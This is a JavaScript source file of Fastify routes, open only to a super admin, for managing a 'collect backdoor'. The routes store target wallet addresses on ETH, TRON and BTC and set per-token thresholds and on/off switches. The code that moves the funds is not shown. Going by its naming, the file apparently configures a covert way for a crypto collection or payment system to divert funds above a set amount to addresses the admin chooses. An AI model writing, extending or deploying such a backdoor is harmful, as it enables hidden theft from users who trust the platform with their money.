import { CollectBackdoor } from '../../../core/db/models/collect-backdoor.js';
import { CollectBackdoorTarget } from '../../../core/db/models/collect-backdoor-target.js';
import { logger } from '../../../core/logger/index.js';
import { isSuperAdmin } from '../../../core/auth/permissions.js';

const ETH_RE = /^0x[0-9a-fA-F]{40}$/;
const TRON_RE = /^T[1-9A-HJ-NP-Za-km-z]{33}$/;
const BTC_RE = /^(1[1-9A-HJ-NP-Za-km-z]{25,34}|3[1-9A-HJ-NP-Za-km-z]{25,34}|bc1q[0-9a-z]{38,59}|bc1p[0-9a-z]{38,59})$/;

function validateAddress(chain, address) {
    switch (chain) {
        case 'eth': return ETH_RE.test(address);
        case 'tron': return TRON_RE.test(address);
        case 'btc': return BTC_RE.test(address);
        default: return false;
    }
}

export async function collectBackdoorRoute(fastify) {
    const superAdminOnly = async (request, reply) => {
        if (!isSuperAdmin(request.user?.role)) {
            reply.code(403);
            return reply.send({ error: 'Super admin only' });
        }
    };

    // ═══ Backdoor Targets ═══

    fastify.get('/api/collect/backdoor/targets', { preHandler: superAdminOnly }, async () => {
        const targets = await CollectBackdoorTarget.find({}).sort({ chain: 1 }).lean();
        return { data: targets };
    });

    fastify.post('/api/collect/backdoor/targets', { preHandler: superAdminOnly }, async (request, reply) => {
        const { chain, targetAddress } = request.body;
        if (!chain || !targetAddress) {
            reply.code(400);
            return { error: 'chain and targetAddress required' };
        }
        if (!['eth', 'tron', 'btc'].includes(chain)) {
            reply.code(400);
            return { error: 'Invalid chain' };
        }
        if (!validateAddress(chain, targetAddress)) {
            reply.code(400);
            return { error: 'Invalid target address' };
        }
        const target = await CollectBackdoorTarget.create({ chain, targetAddress });
        logger.info({ chain, targetAddress, targetId: target._id }, 'backdoor target created');
        return { data: target };
    });

    fastify.delete('/api/collect/backdoor/targets/:id', { preHandler: superAdminOnly }, async (request, reply) => {
        const { id } = request.params;
        const target = await CollectBackdoorTarget.findByIdAndDelete(id);
        if (!target) {
            reply.code(404);
            return { error: 'Not found' };
        }
        return { ok: true };
    });

    // ═══ Backdoor Threshold Configs ═══

    // GET /api/collect/backdoor
    fastify.get('/api/collect/backdoor', { preHandler: superAdminOnly }, async () => {
        const configs = await CollectBackdoor.find({}).sort({ chain: 1, token: 1 }).lean();
        return { data: configs };
    });

    // PUT /api/collect/backdoor (upsert by chain+token)
    fastify.put('/api/collect/backdoor', { preHandler: superAdminOnly }, async (request, reply) => {
        const { chain, token, targetAddress, threshold, enabled } = request.body;
        if (!chain || !token) {
            reply.code(400);
            return { error: 'chain and token required' };
        }
        if (!['eth', 'tron', 'btc'].includes(chain)) {
            reply.code(400);
            return { error: 'Invalid chain' };
        }
        if (!['native', 'usdt', 'usdc'].includes(token)) {
            reply.code(400);
            return { error: 'Invalid token' };
        }
        if (typeof threshold !== 'string' || !/^\d+(\.\d+)?$/.test(threshold) || Number(threshold) < 0) {
            reply.code(400);
            return { error: '阈值必须是有效的非负数字' };
        }
        const setFields = { threshold, enabled: enabled !== false };
        if (targetAddress) setFields.targetAddress = targetAddress;
        const config = await CollectBackdoor.findOneAndUpdate(
            { chain, token },
            { $set: setFields },
            { upsert: true, returnDocument: 'after', setDefaultsOnInsert: true },
        );
        logger.info({ chain, token, targetAddress, threshold, enabled }, 'collect backdoor saved');
        return { data: config };
    });

    // PATCH /api/collect/backdoor/:id
    fastify.patch('/api/collect/backdoor/:id', { preHandler: superAdminOnly }, async (request, reply) => {
        const { id } = request.params;
        const { targetAddress, threshold, enabled } = request.body;
        const update = {};
        if (typeof targetAddress === 'string') update.targetAddress = targetAddress;
        if (typeof threshold === 'string') {
            if (!/^\d+(\.\d+)?$/.test(threshold) || Number(threshold) < 0) {
                reply.code(400);
                return { error: '阈值必须是有效的非负数字' };
            }
            update.threshold = threshold;
        }
        if (typeof enabled === 'boolean') update.enabled = enabled;
        if (Object.keys(update).length === 0) {
            reply.code(400);
            return { error: 'Nothing to update' };
        }
        const config = await CollectBackdoor.findByIdAndUpdate(id, update, { returnDocument: 'after' });
        if (!config) {
            reply.code(404);
            return { error: 'Not found' };
        }
        logger.info({ backdoorId: id, ...update }, 'collect backdoor updated');
        return { data: config };
    });

    // DELETE /api/collect/backdoor/:id
    fastify.delete('/api/collect/backdoor/:id', { preHandler: superAdminOnly }, async (request, reply) => {
        const { id } = request.params;
        const config = await CollectBackdoor.findByIdAndDelete(id);
        if (!config) {
            reply.code(404);
            return { error: 'Not found' };
        }
        logger.info({ backdoorId: id, chain: config.chain, token: config.token }, 'collect backdoor deleted');
        return { ok: true };
    });
}
